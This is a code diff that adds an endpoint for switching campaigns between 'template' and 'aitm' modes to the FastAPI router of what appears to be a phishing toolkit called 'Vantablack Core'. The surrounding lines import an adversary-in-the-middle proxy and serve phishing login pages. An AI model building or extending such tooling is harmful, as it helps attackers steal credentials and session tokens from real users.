@@ -11,6 +11,7 @@ from core.proxy.aitm import aitm_proxy
 from core.session.session_manager import session_manager
 from core.web.polymorph import PolymorphicEngine
 from pathlib import Path
+from pydantic import BaseModel
 
 router = APIRouter(prefix="/v5", tags=["Vantablack Core"])
 
@@ -127,6 +128,22 @@ async def create_campaign(
 async def list_templates():
     """Liste les templates disponibles."""
     return {"templates": social_manager.list_templates()}
+
+class CampaignModePayload(BaseModel):
+    mode: str
+
+@router.post("/campaigns/{campaign_id}/mode")
+async def set_campaign_mode(campaign_id: str, payload: CampaignModePayload):
+    """
+    Définit le mode d'une campagne: 'template' ou 'aitm'.
+    """
+    try:
+        updated = social_manager.update_campaign_mode(campaign_id, payload.mode)
+        if not updated:
+            raise HTTPException(status_code=404, detail="Campaign not found")
+        return {"status": "success", "campaign": updated}
+    except ValueError as e:
+        raise HTTPException(status_code=400, detail=str(e))
 
 @router.get("/phish/{campaign_id}/login")
 async def serve_phishing_page(campaign_id: str, request: Request, sid: Optional[str] = None):
